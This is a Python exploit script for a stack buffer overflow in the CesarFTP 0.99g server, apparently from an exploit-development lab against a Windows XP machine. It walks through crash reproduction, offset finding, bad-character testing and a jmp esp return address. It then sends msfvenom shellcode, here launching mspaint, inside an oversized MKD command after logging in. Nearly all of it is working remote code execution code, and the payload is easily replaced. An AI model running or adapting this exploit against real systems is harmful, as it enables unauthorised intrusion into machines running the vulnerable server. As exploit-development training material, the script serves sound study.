#!/usr/bin/python3

# CesarFTP 0.99g
# Original exploit and vulnerable app available at: https://www.exploit-db.com/exploits/1906
# Exploit tested on Windows XP Pro SP3 FR

import socket
import sys

# msfvenom -p windows/exec cmd=mspaint -b '\x00,\x0a\x0d,\x5c' -f python -v shellcode
shellcode =  b""
shellcode += b"\xda\xda\xbb\x94\xc1\x61\x1e\xd9\x74\x24\xf4"
shellcode += b"\x5a\x31\xc9\xb1\x31\x83\xc2\x04\x31\x5a\x13"
shellcode += b"\x03\xce\xd2\x83\xeb\x12\x3c\xc1\x14\xea\xbd"
shellcode += b"\xa6\x9d\x0f\x8c\xe6\xfa\x44\xbf\xd6\x89\x08"
shellcode += b"\x4c\x9c\xdc\xb8\xc7\xd0\xc8\xcf\x60\x5e\x2f"
shellcode += b"\xfe\x71\xf3\x13\x61\xf2\x0e\x40\x41\xcb\xc0"
shellcode += b"\x95\x80\x0c\x3c\x57\xd0\xc5\x4a\xca\xc4\x62"
shellcode += b"\x06\xd7\x6f\x38\x86\x5f\x8c\x89\xa9\x4e\x03"
shellcode += b"\x81\xf3\x50\xa2\x46\x88\xd8\xbc\x8b\xb5\x93"
shellcode += b"\x37\x7f\x41\x22\x91\xb1\xaa\x89\xdc\x7d\x59"
shellcode += b"\xd3\x19\xb9\x82\xa6\x53\xb9\x3f\xb1\xa0\xc3"
shellcode += b"\x9b\x34\x32\x63\x6f\xee\x9e\x95\xbc\x69\x55"
shellcode += b"\x99\x09\xfd\x31\xbe\x8c\xd2\x4a\xba\x05\xd5"
shellcode += b"\x9c\x4a\x5d\xf2\x38\x16\x05\x9b\x19\xf2\xe8"
shellcode += b"\xa4\x79\x5d\x54\x01\xf2\x70\x81\x38\x59\x1f"
shellcode += b"\x54\xce\xe4\x6d\x56\xd0\xe6\xc1\x3f\xe1\x6d"
shellcode += b"\x8e\x38\xfe\xa4\xea\xb7\xb4\xe4\x5b\x50\x11"
shellcode += b"\x7d\xde\x3d\xa2\xa8\x1d\x38\x21\x58\xde\xbf"
shellcode += b"\x39\x29\xdb\x84\xfd\xc2\x91\x95\x6b\xe4\x06"
shellcode += b"\x95\xb9\x89\xdb\x19\x23\x38\x72\xae\xa3"

#Step 1: Replicate the crash
buffer = b"\n"*670 + b"A"*50 

#Step 2: Find the offset
buffer = b"\n"*670 + b"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab"

#Step 3: Check the offset and find space for shellcode
buffer = b"\n"*670 + b"A"*9 + b"BBBB" + b"C"*50

#Step 4: Find space for shellcode on stack
buffer = b"\n"*670 + b"A"*9 + b"BBBB" + b"C"*334

#Step 4: Find the bad chars \x00,\x0a,\x0d,\x5c
badchars = b""
badchars += b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0b\x0c\x0e\x0f"
badchars += b"\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f"
badchars += b"\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
buffer = b"\n"*670 + b"A"*9 + b"BBBB" + badchars

#Step 5: Exploit
# Message=  0x7c9e30d7 : jmp esp |  {PAGE_EXECUTE_READ} [SHELL32.dll] ASLR: False, Rebase: False, SafeSEH: True, OS: True, v6.00.2900.5512 (C:\WINDOWS\system32\SHELL32.dll)
ret = b"\xd7\x30\x9e\x7c"

buffer = b"\n"*670 + b"A"*9 + ret + b"\x90"*8 + shellcode

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connect=s.connect(('10.0.2.4',21))
s.recv(1024)
s.send(b"USER user\r\n")
s.recv(1024)
s.send(b"PASS password\r\n")
s.recv(1024)
s.send(b"MKD " + buffer + b"\r\n")
s.close()
